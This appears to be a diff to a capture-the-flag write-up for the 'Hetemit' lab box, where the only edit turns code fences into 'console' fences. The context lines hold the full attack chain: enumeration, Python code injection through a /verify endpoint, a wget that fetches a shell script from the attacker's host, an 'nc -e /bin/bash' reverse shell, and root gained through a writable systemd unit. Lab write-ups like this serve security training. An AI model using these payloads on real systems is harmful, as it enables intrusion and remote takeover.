@@ -3,7 +3,7 @@
 # 🐧Hetemit🐧
 ## Enumeration
 Nmap
-```
+```console
 (ming㉿kali)-[~/Downloads]
 └─$ nmap -p- -T4 -sV 192.168.129.117
 
@@ -23,7 +23,7 @@ PORT      STATE SERVICE     VERSION
 
 Found port 50000 running http with python  
 Then use Gobuster to find subdirectory and got /verfiy
-```
+```console
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ gobuster dir -u http://192.168.129.117:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ===============================================================
@@ -44,7 +44,7 @@ Starting gobuster in directory enumeration mode
 ```
 
 Use curl to get more info and the website looks running python code
-```
+```console
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ curl -i http://192.168.129.117:50000/verify
 HTTP/1.0 200 OK
@@ -57,7 +57,7 @@ Date: Fri, 30 Jan 2026 10:10:42 GMT
 ```
 
 verify it with a simple math and it works
-```
+```console
 The web looks running the code with python   
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ curl -i http://192.168.129.117:50000/verify -X POST -d "code=5*5"                                    
@@ -73,7 +73,7 @@ Date: Fri, 30 Jan 2026 10:07:12 GMT
 
 Use python code to execute command whoami to confirm we have RCE
 
-```
+```console
 Use python code to execute command whoami to confirm we have RCE
 $ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('whoami').read()"
 
@@ -86,7 +86,7 @@ Date: Fri, 30 Jan 2026 10:20:19 GMT
 cmeeks
 ```
 Upload a reverse shell
-```
+```console
 $ curl -i http://192.168.129.117:50000/verify -X POST -d "code=__import__('os').popen('wget http://192.168.45.167/shell.sh -O shell.sh').read()"
 
 HTTP/1.0 200 OK
@@ -96,7 +96,7 @@ Server: Werkzeug/1.0.1 Python/3.6.8
 Date: Fri, 30 Jan 2026 10:23:32 GMT
 ```
 Got reverse shell back
-```
+```console
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ nc -lvnp 21
 listening on [any] 21 ...
@@ -109,7 +109,7 @@ cmeeks
 sh-4.4$ 
 ```
 ## Privilege escalation
-```
+```console
 Run linpeas and found we have write permission over a pythonapp.service  
 ╔══════════╣ Permissions in init, init.d, systemd, and rc.d
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd      
@@ -117,7 +117,7 @@ You have write privileges over /etc/systemd/system/pythonapp.service
 ```
 The pythonapp.service is a script systemd service unit file.   
 It is used by Linux to manage how a background application starts, stops, and restarts automatically.
-```
+```console
 [Unit]
 Description=Python App
 After=network-online.target
@@ -136,7 +136,7 @@ Restart=on-failure
 WantedBy=multi-user.target
 ```
 We can change the script user to root to get the root shell
-```
+```console
 [cmeeks@hetemit system]$ cat pythonapp.service
 [Unit]
 Description=Python App
@@ -156,7 +156,7 @@ Restart=on-failure
 WantedBy=multi-user.target
 ```
 Then reboot the server to get root
-```
+```console
 [cmeeks@hetemit system]$ sudo -l
 sudo -l
 Matching Defaults entries for cmeeks on hetemit:
@@ -172,11 +172,11 @@ User cmeeks may run the following commands on hetemit:
     (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
 [cmeeks@hetemit system]$ sudo /sbin/reboot
 ```
-```
+```console
 ┌──(ming㉿kali)-[~/Downloads]
 └─$ curl -i http://192.168.129.117:50000/verify -X POST --data "code=__import__('os').popen('nc 192.168.45.167 80 -e /bin/bash').read()"
 ```
-```
+```console
 $ nc -lvnp 80
 listening on [any] 80 ...
 
